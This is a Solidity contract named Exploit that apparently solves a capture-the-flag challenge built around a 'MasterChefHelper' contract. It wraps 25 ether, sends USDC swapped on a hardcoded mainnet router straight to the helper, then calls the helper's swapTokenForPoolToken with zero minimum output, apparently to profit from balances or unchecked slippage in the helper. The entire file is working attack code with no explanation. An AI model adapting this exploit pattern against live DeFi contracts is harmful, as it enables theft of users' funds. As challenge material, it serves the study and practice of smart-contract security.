pragma solidity 0.8.16;

import "public/Setup.sol";

contract Exploit {

    constructor(Setup setup) payable {

        WETH9 weth = setup.weth();
		MasterChefHelper mcHelper = setup.mcHelper();
        UniswapV2RouterLike router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
		weth.approve(address(router), type(uint256).max);

		weth.deposit{value: 25 ether}();

		address[] memory path = new address[](2);

		path[0] = address(weth);
		path[1] = usdc;
		router.swapExactTokensForTokens(
			20 ether,
			0,
			path,
			address(mcHelper),
			block.timestamp
		);

		path[0] = address(weth);
		path[1] = dai;
		router.swapExactTokensForTokens(
			1 ether,
			0,
			path,
			address(this),
			block.timestamp
		);

		uint256 daiIn = 50 * 10 ** 18;
		ERC20Like(dai).approve(address(mcHelper), type(uint256).max);
		mcHelper.swapTokenForPoolToken(1, dai, daiIn, 0);
    }
}
